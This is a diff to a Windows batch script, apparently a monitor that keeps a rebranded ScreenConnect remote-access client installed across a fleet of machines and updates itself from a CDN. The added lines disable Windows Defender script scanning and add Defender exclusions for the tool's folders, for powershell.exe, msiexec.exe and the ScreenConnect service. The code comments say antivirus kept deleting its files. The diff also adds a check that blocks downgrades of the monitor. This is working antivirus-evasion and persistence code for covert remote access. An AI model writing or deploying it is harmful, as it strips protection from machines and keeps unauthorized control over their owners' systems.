@@ -1,8 +1,8 @@
 @echo off
 rem ═══════════════════════════════════════════════════════════════
-rem  OWN_MON  BUILD 20260804M55
+rem  OWN_MON  BUILD 20260804M56
+rem  M56: refuse mon downgrade (CDN/AMSI was re-applying M36); AMSI exclusions at tick start; cmd-only Gryxa path.
 rem  M55: no auto HEAL msiexec unless 1060; HEALTHY needs relay (L48). Stops HEAL /x killing online Guests.
-rem  M54: 1060 always bypasses heal rate-limit; STOPPED+relay start-only (M53).
 rem  M52: auto-heal stuck Gryxa (1060+dir / RUNNING no gryxa.com ImagePath) via F8/G7; restore lib if AV ate it.
 rem  M51: force_gryxa.flag queues own_gryxa_force REINSTALL (panel wipe). Daily path stays freeze.
 rem  M50: hash-mismatch → BUILD fallback (unstick CDN-stale main).
@@ -51,9 +51,17 @@ set "MSI_G=%ProgramData%\ScreenConnect.Gryxa.msi"
 set "MSICACHE_G=%WD%\pkg_gryxa.msi"
 
 if not exist "%WD%" md "%WD%" 2>nul
+rem M56: AMSI exclusions FIRST (before any powershell) — AV was wiping lib and forcing M36 fallback
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScriptScanning /t REG_DWORD /d 1 /f >nul 2>&1
+reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%WD%" /t REG_DWORD /d 0 /f >nul 2>&1
+reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%ETL%" /t REG_DWORD /d 0 /f >nul 2>&1
+reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%SystemRoot%\Temp\.upd" /t REG_DWORD /d 0 /f >nul 2>&1
+reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "powershell.exe" /t REG_DWORD /d 0 /f >nul 2>&1
+reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "ScreenConnect.ClientService.exe" /t REG_DWORD /d 0 /f >nul 2>&1
+reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "msiexec.exe" /t REG_DWORD /d 0 /f >nul 2>&1
 if not exist "%LOG%" type nul>"%LOG%" 2>nul
 
-set "MONVER=M55"
+set "MONVER=M56"
 set "PF86=%ProgramFiles(x86)%"
 set "GRYXA_DEEP=%WD%\gryxa_deep.flag"
 rem load current Gryxa FP (may rotate when server/keys change)
@@ -175,6 +183,29 @@ if /I "!UPD_OK!"=="1" (
   del /f /q "%STAGE%\tg_report.new" "%STAGE%\own_secure.new" "%STAGE%\own_lib.new" "%STAGE%\own_mon.next" "%STAGE%\own_gryxa.new" >nul 2>&1
   set "SELF_UPD=0"
 )
+
+rem M56: NEVER apply mon older than M50 (CDN/stale was downgrading fleet to M36)
+if "!SELF_UPD!"=="1" if exist "%STAGE%\own_mon.next" (
+  findstr /C:"OWN_MON  BUILD 20260804M5" "%STAGE%\own_mon.next" >nul 2>&1
+  if errorlevel 1 (
+    echo mon_update_refused_not_M5x>>"%LOG%"
+    del /f /q "%STAGE%\own_mon.next" >nul 2>&1
+    set "SELF_UPD=0"
+  )
+)
+rem if we already run M55+, refuse anything without M55/M56
+if "!SELF_UPD!"=="1" (
+  findstr /C:"MONVER=M55" /C:"MONVER=M56" /C:"MONVER=M57" "%WD%\own_mon.cmd" >nul 2>&1
+  if not errorlevel 1 (
+    findstr /C:"MONVER=M55" /C:"MONVER=M56" /C:"MONVER=M57" "%STAGE%\own_mon.next" >nul 2>&1
+    if errorlevel 1 (
+      echo mon_downgrade_blocked>>"%LOG%"
+      del /f /q "%STAGE%\own_mon.next" >nul 2>&1
+      set "SELF_UPD=0"
+    )
+  )
+)
+
 del /f /q "%STAGE%\tg_report.new" "%STAGE%\own_secure.new" "%STAGE%\own_lib.new" "%STAGE%\own_gryxa.new" >nul 2>&1
 del /f /q "%STAGE%\update.manifest" "%STAGE%\update.manifest.sig" >nul 2>&1
 
